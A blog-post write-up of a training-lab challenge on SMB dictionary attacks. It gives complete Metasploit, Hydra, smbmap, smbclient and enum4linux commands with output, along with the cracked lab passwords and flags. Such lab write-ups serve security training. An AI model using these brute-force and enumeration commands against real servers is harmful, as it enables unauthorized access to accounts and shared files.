---
layout: post
title: "SMB Dictionary Attack"
date: "2022-08-20"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Assessment Methodologies
    - Enumeration
---

# SMB Dictionary Attack
```
ip a

inet 192.125.26.2
```

```
nmap 192.125.26.3 
```

```
msfconsole

use auxiliary/scanner/smb/smb_login
info
options
set rhosts 192.125.26.3
set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
set smbuser jane
options
run
exit
```

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.125.26.3 smb
```

```
smbmap -H 192.125.26.3 -u admin -p password1
```

If any of these shares is browsable? jane's share is not browsable.

```
smbclient -L 192.125.26.3 -U jane
```

```
smbclient //192.125.26.3/jane -U jane
smb: \> ls
smb: \> exit
```

```
smbclient //192.125.26.3/admin -U admin
smb: \> ls
smb: \> cd hidden
smb: \hidden\> ls
smb: \hidden\> get flag.tar.gz
smb: \hidden\> exit
```

```
ls
tar -xf flag.tar.gz
ls
cat flag
```

enumerate named pipes.

[Named Pipes](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wpo/4de75e21-36fd-440a-859b-75accc74487c)

```
msfconsole
use auxiliary/scanner/smb/pipe_auditor
set smbuser admin
set smbpass password1
set rhosts 192.125.26.3
options
run
```

```
[+] 192.125.26.3:139    - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
```

Get a list of SID of differnt users.

[安全标识符](https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/understand-security-identifiers)

```
enum4linux -r -u "admin" -p "password1" 192.125.26.3
```

```
[+] Enumerating users using SID S-1-22-1 and logon username 'admin', password 'password1'
S-1-22-1-1000 Unix User\shawn (Local User)
S-1-22-1-1001 Unix User\jane (Local User)
S-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\admin (Local User)
```

# Samba Recon：字典攻击
## 概述
在这个挑战中，我们将研究 SMB 服务器上的字典攻击。请开始实验并回答以下问题：

**问题**

1. 访问共享“jane”需要用户“jane”的密码是多少？使用 smb_login metasploit 模块和密码 wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
2. 访问共享“admin”需要用户“admin”的密码是多少？使用 hydra 和密码 wordlist：/usr/share/wordlists/rockyou.txt
3. 哪个共享是只读的？将 smbmap 与问题 2 中获得的凭据一起使用。
4. 共享“简”是否可浏览？使用从第一个问题获得的凭据。
5. 从共享“admin”中获取标志
6. 列出 samba 服务器上 SMB 上可用的命名管道？将 pipe_auditor metasploit 模块与从问题 2 中获得的凭据一起使用。
7. 通过使用 enum4Linux 和问题 2 中获得的凭据执行 RID 循环，分别列出 Unix 用户 shawn、jane、nancy 和 admin 的 sid。

**指示：**

* 这个实验室是献给你的！此网络上没有其他用户 :)
* 开始实验室后，您将可以访问 Kali 实例的根终端
* 你的 Kali 有一个 IP 地址为 192.XYZ 的接口运行“ip addr”以了解 X 和 Y 的值。
* 目标机器应位于 IP 地址 192.XY3。
* 不要攻击位于 IP 地址 192.XY1 的网关

## 我自己的思路

In this challenge we will look at the dictionary attack on SMB server.  Please start the lab and answer the following questions:

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
27998: eth0@if27999: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.3/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
28001: eth1@if28002: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:79:b5:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.121.181.2/24 brd 192.121.181.255 scope global eth1
       valid_lft forever preferred_lft forever
```

```
root@attackdefense:~# nmap 192.121.181.3
Starting Nmap 7.70 ( https://nmap.org ) at 2022-08-20 08:53 UTC
Nmap scan report for target-1 (192.121.181.3)
Host is up (0.000010s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:79:B5:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

Questions

What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt

`jane:abc123`

```
root@attackdefense:~# msfconsole -q
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > info

       Name: SMB Login Check Scanner
     Module: auxiliary/scanner/smb/smb_login
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  tebo <tebo@attackresearch.com>
  Ben Campbell <eat_meatballs@hotmail.co.uk>
  Brandon McCann "zeknox" <bmccann@accuvant.com>
  Tom Sellers <tom@fadedcode.net>

Check supported:
  Yes

Basic options:
  Name               Current Setting  Required  Description
  ----               ---------------  --------  -----------
  ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
  BLANK_PASSWORDS    false            no        Try blank passwords for all users
  BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
  DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
  DB_ALL_PASS        false            no        Add all passwords in the current database to the list
  DB_ALL_USERS       false            no        Add all users in the current database to the list
  DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
  DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
  PASS_FILE                           no        File containing passwords, one per line
  PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
  Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
  RECORD_GUEST       false            no        Record guest-privileged random logins to the database
  RHOSTS                              yes       The target address range or CIDR identifier
  RPORT              445              yes       The SMB service port (TCP)
  SMBDomain          .                no        The Windows domain to use for authentication
  SMBPass                             no        The password for the specified username
  SMBUser                             no        The username to authenticate as
  STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
  THREADS            1                yes       The number of concurrent threads
  USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
  USER_AS_PASS       false            no        Try the username as the password for all users
  USER_FILE                           no        File containing usernames, one per line
  VERBOSE            true             yes       Whether to print output for all attempts

Description:
  This module will test a SMB login on a range of machines and report 
  successful logins. If you have loaded a database plugin and 
  connected to a database this module will record successful logins 
  and hosts so you can track your access.

References:
  https://cvedetails.com/cve/CVE-1999-0506/

msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.121.181.3
RHOSTS => 192.121.181.3
msf5 auxiliary(scanner/smb/smb_login) > set SMBUser jane
SMBUser => jane
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
PASS_FILE => /usr/share/wordlists/metasploit/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > exploit

[*] 192.121.181.3:445     - 192.121.181.3:445 - Starting SMB login bruteforce
[-] 192.121.181.3:445     - 192.121.181.3:445 - Failed: '.\jane:admin',
[!] 192.121.181.3:445     - No active DB -- Credential data will not be saved!
[-] 192.121.181.3:445     - 192.121.181.3:445 - Failed: '.\jane:123456',
[-] 192.121.181.3:445     - 192.121.181.3:445 - Failed: '.\jane:12345',
[-] 192.121.181.3:445     - 192.121.181.3:445 - Failed: '.\jane:123456789',
[-] 192.121.181.3:445     - 192.121.181.3:445 - Failed: '.\jane:password',
[-] 192.121.181.3:445     - 192.121.181.3:445 - Failed: '.\jane:iloveyou',
[-] 192.121.181.3:445     - 192.121.181.3:445 - Failed: '.\jane:princess',
[-] 192.121.181.3:445     - 192.121.181.3:445 - Failed: '.\jane:1234567',
[-] 192.121.181.3:445     - 192.121.181.3:445 - Failed: '.\jane:12345678',
[+] 192.121.181.3:445     - 192.121.181.3:445 - Success: '.\jane:abc123'
[*] 192.121.181.3:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) > exit
```

What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt

`[445][smb] host: 192.121.181.3   login: admin   password: password1`

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

```
root@attackdefense:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.121.181.3 smb
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-20 09:15:39
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.121.181.3:445/
[445][smb] host: 192.121.181.3   login: admin   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-20 09:15:41
```

Which share is read only? Use smbmap with credentials obtained in question 2.

`nancy`

```
root@attackdefense:~# smbmap -u admin -p password1 -H 192.121.181.3
[+] Finding open SMB ports....
[+] User SMB session establishd on 192.121.181.3...
[+] IP: 192.121.181.3:445       Name: target-1                                          
        Disk                                                    Permissions
        ----                                                    -----------
        shawn                                                   READ, WRITE
        nancy                                                   READ ONLY
        admin                                                   READ, WRITE
        IPC$                                                    NO ACCESS
```

Is share “jane” browseable? Use credentials obtained from the 1st question.

`no`

```
root@attackdefense:~# smbclient -L 192.121.181.3 -U jane
Enter WORKGROUP\jane's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        shawn           Disk      
        nancy           Disk      
        admin           Disk      
        IPC$            IPC       IPC Service (brute.samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS
```

尽管jane共享不可浏览，但是是存在的。

```
root@attackdefense:~# smbclient //192.121.181.3/jane -U jane
Enter WORKGROUP\jane's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  logs                                D        0  Tue Nov 27 19:25:12 2018
  flag                                D        0  Tue Nov 27 19:25:12 2018
  admin                               D        0  Tue Nov 27 19:25:12 2018

                1981094964 blocks of size 1024. 97279524 blocks available
smb: \> cd flag\
smb: \flag\> ls
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  flag                                N       33  Tue Nov 27 19:25:12 2018

                1981094964 blocks of size 1024. 97279520 blocks available
smb: \flag\> get flag 
getting file \flag\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
smb: \flag\> exit
root@attackdefense:~# ls
README  flag  tools  wordlists
root@attackdefense:~# cat flag 
16cb5a2bebf654439291fc9b73b0a6d0
```

Fetch the flag from share “admin”

`2727069bc058053bd561ce372721c92e`

```
root@attackdefense:~# smbclient //192.121.181.3/admin -U admin
Enter WORKGROUP\admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 20 09:20:42 2022
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  hidden                              D        0  Tue Nov 27 19:25:12 2018

                1981094964 blocks of size 1024. 97265232 blocks available
smb: \> cd hidden\
smb: \hidden\> ls
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Sat Aug 20 09:20:42 2022
  flag.tar.gz                         N      151  Tue Nov 27 19:25:12 2018

                1981094964 blocks of size 1024. 97265224 blocks available
smb: \hidden\> get flag.tar.gz 
getting file \hidden\flag.tar.gz of size 151 as flag.tar.gz (147.4 KiloBytes/sec) (average 147.5 KiloBytes/sec)
smb: \hidden\> exit
root@attackdefense:~# ls
README  flag.tar.gz  tools  wordlists
root@attackdefense:~# tar -xf flag.tar.gz  
root@attackdefense:~# ls
README  flag  flag.tar.gz  tools  wordlists
root@attackdefense:~# cat flag
2727069bc058053bd561ce372721c92e
```

List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.

`Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc`

```
msf5 > search pipe_auditor

Matching Modules
================

   #  Name                                Disclosure Date  Rank    Check  Description
   -  ----                                ---------------  ----    -----  -----------
   1  auxiliary/scanner/smb/pipe_auditor                   normal  Yes    SMB Session Pipe Auditor


msf5 > use auxiliary/scanner/smb/pipe_auditor
msf5 auxiliary(scanner/smb/pipe_auditor) > show options

Module options (auxiliary/scanner/smb/pipe_auditor):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target address range or CIDR identifier
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/pipe_auditor) > set RHOSTS 192.121.181.3
RHOSTS => 192.121.181.3
msf5 auxiliary(scanner/smb/pipe_auditor) > set SMBUser admin
SMBUser => admin
msf5 auxiliary(scanner/smb/pipe_auditor) > set SMBPass password1
SMBPass => password1
msf5 auxiliary(scanner/smb/pipe_auditor) > run

[+] 192.121.181.3:139     - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
[*] 192.121.181.3:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.

```
S-1-22-1-1000
S-1-22-1-1001
S-1-22-1-1002
S-1-22-1-1003
```

```
-u user   specify username to use (default "")
-p pass   specify password to use (default "")
-r        enumerate users via RID cycling
```

```
root@attackdefense:~# enum4linux -r -u "admin" -p "password1" 192.121.181.3
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Aug 20 09:49:13 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.121.181.3
RID Range ........ 500-550,1000-1050
Username ......... 'admin'
Password ......... 'password1'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 192.121.181.3    |
 ===================================================== 
[+] Got domain/workgroup name: RECONLABS

 ====================================== 
|    Session Check on 192.121.181.3    |
 ====================================== 
[+] Server 192.121.181.3 allows sessions using username 'admin', password 'password1'

 ============================================ 
|    Getting domain SID for 192.121.181.3    |
 ============================================ 
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================================================== 
|    Users on 192.121.181.3 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-2
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3690628376-3985617143-2159776750
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username 'admin', password 'password1'
S-1-22-1-1000 Unix User\shawn (Local User)
S-1-22-1-1001 Unix User\jane (Local User)
S-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\admin (Local User)
[+] Enumerating users using SID S-1-22-2 and logon username 'admin', password 'password1'
S-1-22-2-1000 Unix Group\admins (Domain Group)
S-1-22-2-1001 Unix Group\Maintainer (Domain Group)
S-1-22-2-1002 Unix Group\Reserved (Domain Group)
S-1-22-2-1003 Unix Group\Testing (Domain Group)
[+] Enumerating users using SID S-1-5-32 and logon username 'admin', password 'password1'
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[+] Enumerating users using SID S-1-5-21-3690628376-3985617143-2159776750 and logon username 'admin', password 'password1'
S-1-5-21-3690628376-3985617143-2159776750-501 SAMBA-RECON-BRUTE\nobody (Local User)
S-1-5-21-3690628376-3985617143-2159776750-513 SAMBA-RECON-BRUTE\None (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1000 SAMBA-RECON-BRUTE\shawn (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1001 SAMBA-RECON-BRUTE\jane (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1002 SAMBA-RECON-BRUTE\nancy (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1003 SAMBA-RECON-BRUTE\admin (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1004 SAMBA-RECON-BRUTE\Maintainer (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1005 SAMBA-RECON-BRUTE\Reserved (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1006 SAMBA-RECON-BRUTE\Testing (Local Group)
enum4linux complete on Sat Aug 20 09:49:28 2022
```

## 解决方案
此实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-556.pdf

参考：

[Samba](https://www.samba.org/)

[smbmap](https://www.kali.org/tools/smbmap/)

[smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)

[hydra](https://www.kali.org/tools/hydra/)

[SMB Login Check Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login/)

[SMB Session Pipe Auditor](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/pipe_auditor/)

[enum4linux](https://www.kali.org/tools/enum4linux/)
